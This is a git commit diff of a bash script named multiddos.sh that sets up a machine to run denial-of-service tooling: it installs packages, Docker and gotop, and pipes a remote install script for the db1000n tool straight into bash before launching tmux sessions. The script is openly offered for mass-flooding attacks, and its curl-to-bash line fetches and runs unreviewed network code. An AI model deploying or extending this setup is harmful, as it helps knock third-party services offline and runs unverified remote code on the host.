5f6a8a18d540184053f86bbc9e44f3fb85d8f53d
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-04-06 16:39:39 +0300

    Update multiddos.sh

--- multiddos.sh
+++ multiddos.sh
@@ -2,18 +2,25 @@
 sudo apt-get update -y
 sudo apt-get install -y tmux wget torsocks python3 python3-pip gcc libc-dev libffi-dev libssl-dev python3-dev rustc
 pip install --upgrade pip
+if [ ! -f "/usr/local/bin/gotop" ]; then
+    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
+    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
+    rm gotop_3.0.0_linux_amd64.deb
+fi
+if [ ! -f "/usr/bin/docker" ]; then
+    sudo apt install apt-transport-https ca-certificates curl software-properties-common
+    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -
+    sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable"
+    sudo apt install docker-ce
+fi
 
 tmux kill-session -t multiddos
 sudo pkill node
 cd ~
-rm -f multiddos
+rm -rf multiddos
 mkdir multiddos
 cd multiddos
 curl https://raw.githubusercontent.com/Arriven/db1000n/main/install.sh | bash
-if [ ! -f "/usr/local/bin/gotop" ]; then
-    wget https://github.com/cjbassi/gotop/releases/download/3.0.0/gotop_3.0.0_linux_amd64.deb
-    sudo dpkg -i gotop_3.0.0_linux_amd64.deb
-fi
 
 tmux new-session -s multiddos -d 'gotop -asc solarized'
 sleep 1
